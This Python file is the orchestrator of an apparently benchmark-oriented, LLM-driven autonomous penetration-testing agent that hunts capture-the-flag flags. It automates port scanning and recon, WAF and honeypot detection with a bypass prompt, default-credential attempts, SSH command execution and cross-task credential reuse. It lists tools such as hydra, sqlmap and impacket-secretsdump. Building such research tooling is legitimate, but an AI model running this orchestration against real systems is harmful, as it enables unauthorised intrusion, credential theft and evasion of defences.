"""Orchestrator Agent — Solo Mode main loop with defense awareness.

Reference:
  - Cochise src/cochise/planner.py:131 — Planner + temporary Executor
  - Cochise src/cochise/executor.py:129 — SSH command execution loop
  - CPA hub/task/engine.go:70-121 — TaskEngine state machine
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import shutil
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional

log = logging.getLogger(__name__)

from darwin.cteg import CTEG, TaskRecord
from darwin.data_model import (
    normalize_dkg_state, PipelineState, EndpointInfo,
    OrchestratorPhase, TaskResult, VulnerabilityHypothesis, ExploitationPlan,
)
from darwin.dkg import DKG
from darwin.dpm import DefensePerceptionModule, DefenseStateVector
from darwin.dave import DAVE, ExploitAttempt, parse_tool_stdout
from darwin.tools.mcp_client import MCPClientPool, load_mcp_config
from darwin.tools.mcp_gateway import MCPGateway, ToolResult
from darwin.tools.recon_server import create_recon_gateway, parse_response
from darwin.tools.attack_server import create_attack_gateway
from darwin.utils.http_client import HTTPClient, ProbeClient, HTTPResponse
from darwin.utils.llm import LLMSession
from darwin.utils.phase_logger import PhaseLogger



# -- System Prompts (imported from darwin.prompts) --------------------------
from darwin.prompts.orchestrator import (
    SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
    SYSTEM_PROMPT_ANALYZE,
    SYSTEM_PROMPT_LOGIN,
    SYSTEM_PROMPT_BYPASS,
)

# Version strings that carry no useful information for RAG lookup.
# Filtering them avoids polluting LLM context with irrelevant matches.
class Orchestrator:
    """Main Orchestrator Agent — Solo Mode.

    In Solo Mode, the Orchestrator directly executes tools without spawning sub-agents.
    This is the most efficient mode for single-host, single-vulnerability challenges.

    Reference: Cochise planner.py — Planner + temporary Executor
    """

    # Tools that must never appear in exploitation plans (time-wasters with
    # near-zero success rate).  Mapped to viable alternatives.
    _BLACKLISTED_TOOLS: dict[str, str] = {
        "hydra_ssh_brute": "ssh_exec",
        # Bootstrap already scanned ports — no re-scanning allowed.
        # nmap_scan with --top-ports 1000 would discover ports outside
        # the benchmark range and waste time on irrelevant services.
        "nmap_full_scan": "",
        "masscan_scan": "",
        "nmap_port_range": "",
        "nmap_scan": "",
        "nmap_vulners_scan": "",
        # sqlcmd not installed — use impacket-based tool instead
        "mssql_query": "mssqlclient_query",
    }

    REQUIRED_TOOLS = [
        "nmap", "dirb", "whatweb", "curl",
        "sqlmap", "ffuf", "python3", "ssh", "sshpass",
        "masscan", "gobuster", "nikto", "hydra", "smbmap",
        "wpscan",
    ]
    OPTIONAL_TOOLS = [
        "searchsploit", "msfconsole", "netexec",
        "impacket-secretsdump", "impacket-psexec", "impacket-wmiexec",
        "impacket-GetUserSPNs", "impacket-GetNPUsers",
        "impacket-ticketer",
    ]

    def __init__(
        self,
        llm_session: LLMSession | None = None,
        time_budget: int = 1200,
        token_budget: int = 200000,
        max_context_tokens: int = 180000,
        compression_threshold: float = 0.4,
        browser_enabled: bool = False,
        dkg: DKG | None = None,
    ):
        self.llm = llm_session or LLMSession.from_config("default")
        self.time_budget = time_budget
        self.token_budget = token_budget
        self.max_context_tokens = max_context_tokens
        self.compression_threshold = compression_threshold
        self.browser_enabled = browser_enabled

        # Core modules — reuse external DKG for cross-run state persistence
        self.dkg = dkg or DKG()
        self.dpm = DefensePerceptionModule(llm_session=self.llm)
        self.dave = DAVE(browser_enabled=browser_enabled)
        self.cteg = CTEG(storage_path="cteg_state.json")

        # Tool infrastructure
        self.recon_gateway = create_recon_gateway()
        self.attack_gateway = create_attack_gateway()
        self.mcp_pool = MCPClientPool()
        self.client = HTTPClient()
        self.probe_client = ProbeClient()

        # Task log — structured event log written to file
        self._task_log: List[Dict[str, Any]] = []
        self._task_log_path: str = ""

        # Phase logger — structured file-based output per phase
        self.phase_logger: PhaseLogger | None = None

        # State tracking
        self.phase = OrchestratorPhase.INIT
        self.defense_state = DefenseStateVector()
        self.vulnerabilities: List[VulnerabilityHypothesis] = []
        self.exploitation_plan: ExploitationPlan | None = None
        self.step_count = 0
        self.start_time = 0.0
        self.flag_pattern = re.compile(r"flag\{[a-zA-Z0-9_\-!@#$%^&*()+=]+\}", re.IGNORECASE)
        self._svc_research_done = False
        self._analyze_done = False
        self._research_done = False
        # Track service/endpoint count at analysis time to detect
        # significant new discoveries that warrant re-analysis
        self._analyze_service_snapshot: int = 0
        self._reanalyze_count: int = 0
        self._max_reanalyze: int = 2
        self._solo_iterations = 0
        self._solo_exhausted = False
        self._task_attempt_limit = 3
        self._exhausted_task_ids: set[str] = set()
        self._prev_endpoint_count = 0
        self._prev_credential_count = 0
        self._prev_vulnerability_count = 0
        self._absent_services: set[str] = set()  # host:port/URL probed but unreachable
        self._no_progress_loops = 0  # consecutive outer loops with 0 discoveries
        self._solo_exhausted_stall = 0  # stalled loops when solo exhausted but multi never entered
        self._solo_empty_runs = 0  # consecutive solo runs with 0 done tasks
        self._prev_solo_done_count = 0  # done task count from previous solo run

        # Chain / multi-flag mode
        self._chain_mode = False
        self._captured_flags: list[str] = []
        self._chain_services_total = 0
        self._chain_exhausted = False

    async def run(
        self, task_description: str, target_url: str,
        username: str | None = None, password: str | None = None,
        port_range: str | None = None,
    ) -> TaskResult:
        """Run penetration test against a single target.

        Args:
            port_range: Optional nmap port range for benchmark mode.
                        When set, scans only those ports (e.g. "8080-8090").
                        When None, full 65535-port scan.
        """
        self.start_time = time.time()
        self._solo_cycle_context_injected = False
        self.target_url = target_url
        self._provided_username = username
        self._provided_password = password

        ts = time.strftime("%Y%m%d_%H%M%S", time.localtime())
        self._task_log_path = f"checkpoints/task_{ts}.json"
        self._task_description = task_description
        self._task_log_event("info", "task_start", target=target_url, description=task_description)

        # Initialize phase logger with config-driven settings
        _log_dir = "log"
        _log_level = "INFO"
        try:
            import yaml
            _config_path = getattr(self, "_config_path", "config/darwin.yaml")
            if os.path.exists(_config_path):
                with open(_config_path) as _fh:
                    _cfg = yaml.safe_load(_fh) or {}
                _darwin = _cfg.get("darwin", {})
                _log_dir = _darwin.get("log_dir", "log")
                _log_level = _darwin.get("log_level", "INFO")
        except Exception:
            pass
        self.phase_logger = PhaseLogger(
            run_id=ts,
            log_dir=_log_dir,
            log_level=_log_level,
        )
        self.phase_logger.set_shared_metadata(
            target=target_url,
            model=getattr(self.llm, 'model', ''),
            provider=getattr(self.llm, 'provider', ''),
        )

        self._check_tool_dependencies()
        if self._missing_tools:
            self._task_log_event("warning", "missing_tools", tools=list(self._missing_tools))

        # MCP: parallel connection, non-blocking
        mcp_configs = load_mcp_config("config/mcp_servers.yaml")
        enabled_mcp = [c for c in mcp_configs if c.enabled]
        if enabled_mcp:
            log.info("Connecting to %d MCP server(s) in parallel: %s",
                     len(enabled_mcp), ", ".join(c.name for c in enabled_mcp))
            connected = await self.mcp_pool.connect_all(
                mcp_configs, per_server_timeout=30, total_timeout=90,
            )
            if connected > 0:
                tools = self.mcp_pool.get_tool_names()
                log.info("MCP: %d server(s) connected, %d tools available: %s",
                         connected, len(tools), ", ".join(sorted(tools)[:15]))
        else:
            log.info("No MCP servers enabled in config/mcp_servers.yaml")

        # Preload RAG in background (takes ~45s — run in parallel with bootstrap)
        _rag_task: asyncio.Task | None = None
        try:
            from darwin.rag import get_rag
            _rag_task = asyncio.create_task(asyncio.to_thread(get_rag))
        except Exception:
            pass

        self.phase = OrchestratorPhase.RECON
        result: TaskResult | None = None

        try:
            # ── Phase 1: Bootstrap scan (nmap + HTTP probe) ──
            await self._bootstrap_scan(target_url, port_range=port_range)
            self._task_log_event("info", "bootstrap_done",
                dkg_summary=self.dkg.summary(), step=self.step_count)
            self.dkg.save(self._checkpoint_path("bootstrap"))

            # ── Phase log: scan ──
            if self.phase_logger:
                _hosts = len(self.dkg.query_nodes("Host"))
                _svcs = len(self.dkg.query_nodes("Service"))
                _eps = len(self.dkg.query_nodes("Endpoint"))
                _svc_lines = []
                for s in self.dkg.query_nodes("Service")[:20]:
                    _svc_lines.append(
                        f"  {s.get('port','?')}/{s.get('protocol','tcp')} "
                        f"{s.get('service_name','unknown')} "
                        f"{s.get('version','')} {s.get('banner','')}".strip()
                    )
                _bootstrap_text = (
                    f"[BOOTSTRAP] {_hosts} host(s), {_svcs} service(s), {_eps} endpoint(s)\n"
                    + "\n".join(_svc_lines)
                )
                if _svcs > 20:
                    _bootstrap_text += f"\n  ... and {_svcs - 20} more services"
                self.phase_logger.log_phase("bootstrap", _bootstrap_text,
                    metadata={"hosts": _hosts, "services": _svcs, "endpoints": _eps})

            # ── Phase 1.5: Deep Recon (dirb, nikto, form_extract) ──
            await self._deep_recon()

            # ── Phase log: recon ──
            if self.phase_logger:
                _eps = self.dkg.query_nodes("Endpoint")
                _ep_lines = []
                for ep in _eps[:30]:
                    _url = ep.get("url", "") or ep.get("uri", "")
                    _ep_lines.append(f"  {_url[:100]}")
                _recon_text = (
                    f"[DEEP RECON] {len(_eps)} total endpoints\n"
                    + "\n".join(_ep_lines)
                )
                if len(_eps) > 30:
                    _recon_text += f"\n  ... and {len(_eps) - 30} more"
                self.phase_logger.log_phase("deep_recon", _recon_text,
                    metadata={"endpoints": len(_eps)})

            # ── Phase 1.55: Cloud Platform Discovery ──
            # Check endpoints for cloud-like response signatures and add
            # a vulnerability hint so the LLM explores additional services
            # on the same endpoint (e.g. S3 → IAM, STS, Lambda).
            await self._cloud_discovery_hint()

            # ── Phase 1.6: Defense Detection (DPM) ──
            await self._detect_defenses()

            # ── Phase log: defense detection ──
            if self.phase_logger:
                _waf_type = self.defense_state.waf_type or "none"
                _complexity = getattr(self.defense_state, 'defense_complexity', 0)
                _honeypot = getattr(self.defense_state, 'has_honeypot', False)
                self.phase_logger.log_phase("defense_detection",
                    f"WAF: {_waf_type} | complexity: {_complexity:.2f} | "
                    f"has_honeypot: {_honeypot}",
                    metadata={"waf_type": _waf_type,
                              "complexity": _complexity,
                              "has_honeypot": _honeypot})

            # Query CTEG for cross-task experience
            state = self._get_state()
            tech_query = " ".join(
                s.version or s.banner
                for s in state.services[:5]
                if s.version or s.banner
            )
            cteg_hints = self.cteg.get_suggestions(
                defense_type=self.defense_state.waf_type or "", vuln_type="",
            )
            if cteg_hints.get("bypass_strategies") or cteg_hints.get("exploit_strategies"):
                self._task_log_event("info", "cteg_hints", hints=cteg_hints)

            # Load known credentials from CTEG (cross-task memory)
            # Only inject credentials whose service/port actually EXISTS on the current
            # target. A credential for MSSQL:10119 is useless (and noisy) when the
            # current target is an Apache HTTP server on port 10108.
            _current_ports = {str(s.port) for s in state.services if s.port}
            _current_svc_names = {
                (s.get("service_name", "") or "").lower()
                for s in self.dkg.query_nodes("Service")
                if s.get("service_name")  # exclude nodes without service_name (empty
            }                              # string matches ALL strings in Python)
            _cteg_creds = self.cteg.get_credentials(host=self.target_host)
            _cteg_creds_filtered = []
            for _c in _cteg_creds[:10]:
                _c_port = str(_c.get("port", ""))
                _c_svc = (_c.get("service_type", "") or "").lower()
                # Only inject if the port matches a currently open port, OR the
                # service type matches a discovered service
                _port_match = _c_port in _current_ports
                _svc_match = any(
                    _c_svc in _sn or _sn in _c_svc
                    for _sn in _current_svc_names
                ) if _current_svc_names else False
                if not _port_match and not _svc_match:
                    log.debug("CTEG: skipping credential %s:%s (port %s/%s not on target)",
                              _c['username'], _c['service_type'], _c_port, _c_svc)
                    continue
                _cteg_creds_filtered.append(_c)
                _cred_id = f"cred-cteg-{_c['username']}@{_c['host']}:{_c['port']}"
                self.dkg.add_node("Credential", _cred_id, {
                    "username": _c["username"],
                    "password": _c["password"],
                    "host": _c["host"],
                    "port": _c["port"],
                    "cred_type": _c["service_type"],
                    "source": "cteg_memory",
                })
            if _cteg_creds_filtered:
                log.info("CTEG: loaded %d matching credentials for %s (filtered from %d total)",
                         len(_cteg_creds_filtered), self.target_host, len(_cteg_creds))
            # Use filtered list for hints
            _cteg_creds = _cteg_creds_filtered

            # Inject CTEG credentials into cteg_hints so the LLM sees them
            if _cteg_creds:
                _cred_lines = []
                for _c in _cteg_creds[:8]:
                    _cred_lines.append(
                        f"  {_c['username']}:{_c['password']} → "
                        f"{_c['service_type']}://{_c['host']}:{_c['port']} "
                        f"(ONLY valid for {_c['service_type']} on port {_c['port']} — "
                        f"do NOT reuse for SSH, HTTP, or other services)"
                    )
                cteg_hints["known_credentials"] = _cred_lines

            # ── Main Loop: B-driven mode switching ────────────────
            self._loop_count = 0
            # Try to read max_iterations and chain_mode from darwin.yaml config
            _config_max_loops = 30
            _chain_mode_config = "auto"
            _chain_max_flags = 10
            try:
                import yaml
                _cfg_path = "config/darwin.yaml"
                if __import__("os").path.exists(_cfg_path):
                    with open(_cfg_path, encoding="utf-8") as _fh:
                        _cfg = yaml.safe_load(_fh)
                    _darwin = _cfg.get("darwin", {}) if isinstance(_cfg, dict) else {}
                    _configured = _darwin.get("max_iterations")
                    if isinstance(_configured, int) and _configured > 0:
                        _config_max_loops = _configured
                    _chain_mode_config = _darwin.get("chain_mode", "auto")
                    _chain_max_flags = int(_darwin.get("chain_max_flags", 10))
            except Exception:
                pass
            MAX_LOOPS = _config_max_loops
            self._known_flags: set[str] = set()

            # ── After recon, before main loop: detect chain topology ──
            # NOTE: scaling votes are no longer seeded before the first
            # loop iteration.  The hysteresis mechanism (2 consecutive
            # matching votes) naturally requires 2+ iterations to switch
            # modes, so the first iteration is always Solo.  This gives
            # the LLM a chance to exploit the target before committing
            # to expensive multi-agent spawning.

            # Detect chain topology for multi-flag awareness
            self._detect_chain_topology(_chain_mode_config)
            if self._chain_mode:
                log.info("Chain topology detected: %d services, "
                         "will continue after intermediate flags (max=%d)",
                         self._chain_services_total, _chain_max_flags)
                # Store chain_max_flags for use in termination checks
                self._chain_max_flags = _chain_max_flags
            else:
                self._chain_max_flags = _chain_max_flags  # keep default for safety

            # Snapshot DKG counts after bootstrap so first cycle summary only
            # counts discoveries made DURING the loop (not bootstrap + deep_recon).
            self._prev_endpoint_count = len(self.dkg.query_nodes("Endpoint"))
            self._prev_credential_count = len(self.dkg.query_nodes("Credential"))
            self._prev_vulnerability_count = len(self.dkg.query_nodes("Vulnerability"))

            while not self._should_terminate(result, MAX_LOOPS):
                self._loop_count += 1

                # Check DKG for flags found by sub-agents in previous iterations
                dkg_flags = [
                    f.get("value", "") for f in self.dkg.query_nodes("Flag")
                    if f.get("verified") or f.get("value", "").startswith("flag{")
                ]
                for fv in dkg_flags:
                    if fv and fv not in self._known_flags:
                        self._known_flags.add(fv)
                        if not self._chain_mode:
                            # ORIGINAL BEHAVIOR: stop on first flag
                            self.phase = OrchestratorPhase.DONE
                            result = TaskResult(
                                success=True, flag=fv, steps=self.step_count,
                                tokens_used=self.llm.token_count,
                                time_elapsed=time.time() - self.start_time,
                            )
                        else:
                            # CHAIN MODE: record intermediate flag, continue
                            self._captured_flags.append(fv)
                            log.info("Chain mode: captured intermediate flag %s (%d/%d services)",
                                     fv[:40], len(self._captured_flags),
                                     max(self._chain_services_total, 1))
                            # Check if all exploitable services are exhausted
                            if self._count_unexploited_services() == 0:
                                self._chain_exhausted = True
                                log.info("Chain mode: all services exhausted, chain complete")
                if result and result.success:
                    # In chain mode, only break if chain exhausted
                    if self._chain_mode:
                        if self._chain_exhausted:
                            # Build final result with last captured flag
                            final_flag = self._captured_flags[-1] if self._captured_flags else ""
                            result = TaskResult(
                                success=True, flag=final_flag, steps=self.step_count,
                                tokens_used=self.llm.token_count,
                                time_elapsed=time.time() - self.start_time,
                            )
                            result.all_flags = list(self._captured_flags)
                            break
                        # Otherwise continue the loop
                    else:
                        break

                # Solo-only loop (single-agent control plane)
                self._task_log_event("info", "loop_iteration", loop=self._loop_count)

                # Skip if solo already exhausted — avoid wasted iterations
                if self._solo_exhausted:
                    log.info("Solo mode exhausted, skipping loop %d", self._loop_count)
                    continue

                # Phase 1: Service research → known CVEs for each service (once)
                # Re-trigger if new services discovered since last analysis
                if self._analyze_done and self._reanalyze_count < self._max_reanalyze:
                    _current_svc = len(self.dkg.query_nodes("Service"))
                    _current_eps = len(self.dkg.query_nodes("Endpoint"))
                    _new_total = _current_svc + _current_eps
                    if _new_total > self._analyze_service_snapshot + 2:
                        log.info("New services/endpoints detected (%d→%d), re-running analysis",
                                 self._analyze_service_snapshot, _new_total)
                        self._analyze_done = False
                        self._svc_research_done = False
                        self._reanalyze_count += 1

                if not self._svc_research_done:
                    await self._service_research()
                    self._svc_research_done = True

                    # ── Phase log: service research ──
                    if self.phase_logger:
                        _cves = []
                        for a in self.dkg.query_nodes("Analysis"):
                            if a.get("type") == "cve_findings" and a.get("content"):
                                _cves.append(a.get("content", "")[:500])
                        _cve_text = "\n".join(_cves[:10]) if _cves else "(no CVEs found)"
                        self.phase_logger.log_phase("service_research", _cve_text,
                            metadata={"cve_count": len(_cves)})

                # Phase 2: Analyze recon data + service research → vuln hypotheses
                if not self._analyze_done:
                    await self._analyze_phase()
                    self._analyze_done = True
                    # Snapshot current discovery count so we can detect
                    # significant new services/endpoints for re-analysis
                    self._analyze_service_snapshot = (
                        len(self.dkg.query_nodes("Service"))
                        + len(self.dkg.query_nodes("Endpoint"))
                    )

                    # ── Phase log: analyze ──
                    if self.phase_logger:
                        _vuln_lines = []
                        for v in self.vulnerabilities[:20]:
                            _vuln_lines.append(
                                f"[{v.vuln_type}] {v.endpoint} param={v.param} "
                                f"conf={v.confidence:.0%}"
                            )
                        _vuln_text = "\n".join(_vuln_lines) if _vuln_lines else "(no vulnerabilities)"
                        if len(self.vulnerabilities) > 20:
                            _vuln_text += f"\n... and {len(self.vulnerabilities) - 20} more"
                        self.phase_logger.log_phase("analyze", _vuln_text,
                            metadata={"vuln_count": len(self.vulnerabilities)})

                # Phase 3: Research each vulnerability with tools
                if self.vulnerabilities and not self._research_done:
                    log.info("[PHASE] _research_phase START")
                    await self._research_phase()
                    self._research_done = True
                    log.info("[PHASE] _research_phase DONE")

                    # ── Phase log: research ──
                    if self.phase_logger:
                        _researched = sum(
                            1 for v in self.vulnerabilities
                            if v.research_techniques or v.research_cves
                        )
                        self.phase_logger.log_phase("research_phase",
                            f"Researched {_researched}/{len(self.vulnerabilities)} vulnerabilities",
                            metadata={"vulns_total": len(self.vulnerabilities),
                                      "vulns_researched": _researched})

                # Phase 4: Unified LLM loop (plan → exploit → replan)
                result = await self._unified_llm_loop(target_url, cteg_hints)

                # Allow up to 3 solo iterations before marking exhausted
                self._solo_iterations += 1
                if result is None or not result.success:
                    if self._solo_iterations >= 5:
                        self._solo_exhausted = True
                    # Fast exhaust: 2 consecutive plan-exhausted runs with 0 done tasks
                    _done_count = sum(1 for t in (self.exploitation_plan.tasks if self.exploitation_plan else [])
                                     if isinstance(t, dict) and t.get("status") == "done")
                    _prev_done = getattr(self, '_prev_solo_done_count', -1)
                    if result is None and _done_count == _prev_done:
                        _empty_runs = getattr(self, '_solo_empty_runs', 0) + 1
                        self._solo_empty_runs = _empty_runs
                        if _empty_runs >= 2:
                            log.info("Solo mode: 2 runs with no new progress — marking exhausted")
                            self._solo_exhausted = True
                    else:
                        self._solo_empty_runs = 0
                    self._prev_solo_done_count = _done_count
                else:
                    self._solo_exhausted = True

                # Checkpoint DKG after each loop iteration
                self.dkg.save(self._checkpoint_path(f"loop_{self._loop_count}"))

            # ── Last resort: generic flag search ──────────────────
            if result is None or not result.success:
                flag_result = await self._check_response_for_flag(target_url)
                if flag_result:
                    result = flag_result

        except asyncio.TimeoutError:
            elapsed = time.time() - self.start_time
            if elapsed >= self.time_budget * 0.95:
                error_msg = "Time budget exceeded"
            else:
                error_msg = f"Internal timeout at {elapsed:.0f}s (budget: {self.time_budget}s)"
            result = TaskResult(
                success=False, steps=self.step_count,
                tokens_used=self.llm.token_count,
                time_elapsed=elapsed,
                phase_at_end=self.phase, error=error_msg,
            )
        except Exception as e:
            import traceback
            log.warning("Task failed with error: %s", e)
            log.warning("Traceback: %s", traceback.format_exc())
            result = TaskResult(
                success=False, steps=self.step_count,
                tokens_used=self.llm.token_count,
                time_elapsed=time.time() - self.start_time,
                phase_at_end=self.phase, error=str(e),
            )
        finally:
            await self.client.close()
            if self.mcp_pool.is_connected:
                await self.mcp_pool.disconnect_all()

        # Write task log
        if result is None:
            result = TaskResult(
                success=False, steps=self.step_count,
                tokens_used=self.llm.token_count,
                time_elapsed=time.time() - self.start_time,
                phase_at_end=self.phase,
                error="No result produced",
            )
        self._task_log_event("info" if result.success else "error", "task_end",
            success=result.success,
            flag=result.flag,
            steps=result.steps,
            tokens_used=result.tokens_used,
            time_elapsed=result.time_elapsed,
            error=result.error,
        )

        # ── Phase log: write run summary ──
        if self.phase_logger:
            self.phase_logger.write_summary(
                task_result=result,
                dkg_summary=self.dkg.summary(),
                extra_metadata={
                    "phase_at_end": self.phase.value,
                    "loop_count": getattr(self, '_loop_count', 0),
                    "solo_iterations": self._solo_iterations,
                    "step_count": self.step_count,
                },
            )

        self._task_log_write()

        # Commit task to CTEG for cross-task learning
        if result and self.step_count > 0:
            vuln_types = [v.vuln_type for v in self.vulnerabilities]
            # Extract technology stack from discovered services
            tech_stack = []
            for s in self.dkg.query_nodes("Service"):
                ver = s.get("version", "") or s.get("banner", "")
                if ver and ver not in ("unknown", "tcpwrapped", "ssh"):
                    tech_stack.append(ver)
            # Extract key findings from task log
            key_findings = []
            if result.flag:
                key_findings.append(f"flag found: {result.flag[:30]}...")
            if result.waf_bypassed:
                key_findings.append(f"WAF bypassed: {self.defense_state.waf_type}")
            # Build exploit chain from LLM loop steps
            exploit_chain = getattr(self, '_exploit_chain', [])
            task_record = TaskRecord(
                task_id=f"task-{int(self.start_time)}",
                benchmark="unknown",
                vulnerability_types=vuln_types,
                outcome="success" if result.success else "failure",
                defense_encountered=self.defense_state.to_dict(),
                timestamp=time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime(self.start_time)),
                technology_stack=tech_stack,
                key_findings=key_findings,
                exploit_chain=exploit_chain,
            )
            new_patterns = self.cteg.commit_task(task_record)
            self._cteg_committed = new_patterns
            if new_patterns > 0:
                log.info("CTEG: extracted %d new patterns from task", new_patterns)

        return result

    # ── Phase 1: Bootstrap Scan (nmap only, then LLM takes over) ────

    async def _bootstrap_scan(self, target_url: str, port_range: str | None = None) -> None:
        """Minimal bootstrap: nmap port scan only. LLM drives all further recon.

        Records discovered ports as Host/Service nodes in DKG.
        Marks SSH ports as skip_exploit. Detects AD domain ports.
        Does NOT probe HTTP services — the LLM decides which ports to probe.

        Args:
            port_range: Optional nmap port range (e.g. "8080-8090,3306").
                        When set, scans only those ports. Full scan otherwise.
        """
        self.phase = OrchestratorPhase.BOOTSTRAP
        from urllib.parse import urlparse as _up

        # Normalize bare host:port URLs (e.g. "localhost:10205") so urlparse
        # correctly extracts hostname and port. Without this, urlparse would
        # treat "localhost" as the scheme and "10205" as the path.
        normalized_url = target_url
        if "://" not in target_url:
            normalized_url = f"http://{target_url}"

        parsed = _up(normalized_url)
        host = parsed.hostname or target_url
        self.target_host = host

        self._task_log_event("info", "bootstrap_nmap", host=host, port_range=port_range)
        # Launch K8S cluster discovery in parallel with nmap.
        # Both are independent data sources — nmap sees port mappings,
        # kubectl sees cluster topology. Runs unconditionally; fails
        # silently in <2s if no cluster exists.
        k8s_discovery_task = asyncio.create_task(self._k8s_cluster_discovery())

        # Always include the target URL's port in the scan range
        target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
        if port_range:
            ports = f"{target_port},{port_range}"
            nmap_result = await self.recon_gateway.call("nmap_port_range", {
                "target": host, "ports": ports,
            })
        else:
            nmap_result = await self.recon_gateway.call("nmap_full_scan", {"target": host})

        discovered_ports: list[dict] = []
        if nmap_result.success:
            discovered_ports = nmap_result.parsed_output.get("open_ports", [])
            log.info("nmap: %d open ports on %s", len(discovered_ports), host)
        else:
            common_ports = [80, 443, 8080, 8443, 3000, 5000]
            default_port = parsed.port or (443 if parsed.scheme == "https" else 80)
            if default_port not in common_ports:
                common_ports.insert(0, default_port)
            discovered_ports = [{"port": p, "state": "unknown", "service": "http"}
                                for p in common_ports]
            log.warning("nmap failed for %s, probing %d common HTTP ports",
                       host, len(common_ports))

        # ── Port blacklist ────────────────────────────────────────────
        # Filter out infrastructure ports (IDE port forwarding, SSH tunnels,
        # debug proxies, etc.) that nmap discovers on localhost but are not
        # part of the target scenario.
        _BOOTSTRAP_PORT_BLACKLIST: set[int] = {
            12149,  # VS Code port forwarding
        }
        _before = len(discovered_ports)
        discovered_ports = [p for p in discovered_ports
                            if p.get("port") not in _BOOTSTRAP_PORT_BLACKLIST]
        if len(discovered_ports) < _before:
            log.info("bootstrap: filtered %d blacklisted port(s), %d remaining",
                     _before - len(discovered_ports), len(discovered_ports))

        # When nmap returns tcpwrapped for all ports (common in Docker
        # port-forwarding setups), detect whether the ports share a
        # consistent offset from known AD service ports.
        # E.g. 10088→88(Kerberos), 10389→389(LDAP), 10139→139(NetBIOS)
        # with an offset of +10000.
        _AD_STD_PORTS = {
            88: "kerberos-sec", 135: "msrpc", 139: "netbios-ssn",
            389: "ldap", 445: "microsoft-ds", 636: "ldaps",
        }
        _tcpwrapped = [p for p in discovered_ports
                       if p.get("service", "") == "tcpwrapped"]
        if len(_tcpwrapped) >= 2:
            _offsets: dict[int, int] = {}
            for _tp in _tcpwrapped:
                for _std in _AD_STD_PORTS:
                    if _tp["port"] > _std:
                        _off = _tp["port"] - _std
                        _offsets[_off] = _offsets.get(_off, 0) + 1
            if _offsets:
                _best_offset = max(_offsets, key=_offsets.get)
                if _offsets[_best_offset] >= 2:
                    for _tp in _tcpwrapped:
                        _std_port = _tp["port"] - _best_offset
                        if _std_port in _AD_STD_PORTS:
                            _tp["service"] = _AD_STD_PORTS[_std_port]
                    log.info("nmap: detected port offset +%d, resolved %d tcpwrapped ports",
                             _best_offset, _offsets[_best_offset])

        for p in discovered_ports:
            self.dkg.add_node("Host", f"host-{host}", {
                "ip": host, "is_reachable": True, "is_internal": False,
            })
            self.dkg.add_node("Service", f"svc-{host}-{p['port']}", {
                "port": p["port"], "protocol": "tcp",
                "version": p.get("version", "") or p.get("service", ""),
                "banner": p.get("service", ""),
                "service_name": p.get("service", ""),  # nmap service name for CTEG filtering
            })

        # AD detection: if banner scan identified AD-related services,
        # create a Domain node to enable multi-agent mode.
        _AD_PORTS = {445, 389, 636, 3268, 3269}
        _AD_SVC_NAMES = {"ldap", "ldaps", "kerberos", "kerberos-sec",
                          "microsoft-ds", "netbios-ssn", "msrpc"}
        _has_ad = any(p["port"] in _AD_PORTS for p in discovered_ports)
        _has_ad = _has_ad or any(
            (p.get("service", "") or "").lower() in _AD_SVC_NAMES
            for p in discovered_ports
        )
        if _has_ad:
            self.dkg.add_node("Domain", f"domain-{host}", {
                "name": host, "dc_ip": host, "detected_by": "port_scan",
            })

        # SSH: always available for exploitation (LLM can brute-force or use provided creds)
        _has_ssh_creds = bool(self._provided_username and self._provided_password)
        for p in discovered_ports:
            if p["port"] in {22}:
                self.dkg.add_node("Service", f"svc-{host}-{p['port']}", {
                    "port": p["port"], "protocol": "tcp",
                    "version": p.get("version", "") or p.get("service", ""),
                    "banner": p.get("service", ""),
                    "skip_exploit": False,
                })

        # Register SSH credentials in DKG when provided, and test connection
        if _has_ssh_creds:
            self.dkg.add_node("Credential", f"cred-ssh-{host}", {
                "username": self._provided_username,
                "password": self._provided_password,
                "source_host": host,
                "cred_type": "ssh",
                "source": "user_provided",
            })
            # Test SSH connection to verify credentials work
            try:
                ssh_result = await self.attack_gateway.call("ssh_exec", {
                    "host": host, "username": self._provided_username,
                    "password": self._provided_password,
                    "command": "id && uname -a",
                })
                if ssh_result.success and "uid=" in (ssh_result.stdout or ""):
                    self.dkg.add_node("Session", f"session-ssh-{host}", {
                        "host": host, "user": self._provided_username,
                        "access_level": "user", "shell_type": "ssh",
                        "established_by": "bootstrap-ssh",
                    })
                    self._task_log_event("info", "ssh_session_established",
                        host=host, user=self._provided_username)
            except Exception:
                pass  # SSH test failure is non-fatal

        # ── Auto-try default credentials for database services ────────
        await self._try_db_default_credentials(host, discovered_ports)

        # Store provided credentials for DB ports too (not just SSH)
        _DB_PORT_PROTO_LOCAL = {3306: "mysql", 5432: "postgresql", 6379: "redis",
                                1433: "mssql", 1521: "oracle", 27017: "mongodb"}
        if self._provided_username and self._provided_password:
            for p in discovered_ports:
                if p["port"] in _DB_PORT_PROTO_LOCAL:
                    proto = _DB_PORT_PROTO_LOCAL[p["port"]]
                    self.dkg.add_node("Credential", f"cred-{proto}-{host}-{p['port']}", {
                        "username": self._provided_username,
                        "password": self._provided_password,
                        "source_host": host,
                        "cred_type": proto,
                        "port": p["port"],
                        "source": "user_provided",
                    })

        # ── Non-HTTP service classification ─────────────────────────
        # Map known ports to protocol types for database and cloud services.
        # Creates Endpoint nodes so the LLM knows these services are reachable
        # and can choose appropriate tools (mysql_query, redis_cmd, kubectl_*, etc.)
        _DB_PORT_PROTO = {
            3306: "mysql", 5432: "postgresql", 6379: "redis",
            1433: "mssql", 1521: "oracle", 27017: "mongodb",
        }
        _K8S_PORTS = {6443, 10250, 10255}
        _K8S_PROTO = "kubernetes"

        for p in discovered_ports:
            port = p["port"]
            if port in _DB_PORT_PROTO:
                proto = _DB_PORT_PROTO[port]
                self.dkg.add_node("Endpoint", f"endpoint-{host}-{port}-{proto}", {
                    "url": f"{proto}://{host}:{port}",
                    "method": proto, "params": proto,
                    "proto": proto,
                    "discovered_by": "bootstrap-nmap",
                })
            elif port in _K8S_PORTS:
                self.dkg.add_node("Endpoint", f"endpoint-{host}-{port}-k8s", {
                    "url": f"https://{host}:{port}",
                    "method": "GET", "params": _K8S_PROTO,
                    "proto": _K8S_PROTO,
                    "discovered_by": "bootstrap-nmap",
                })

        # ── Identify unknown services via API probing ────────────
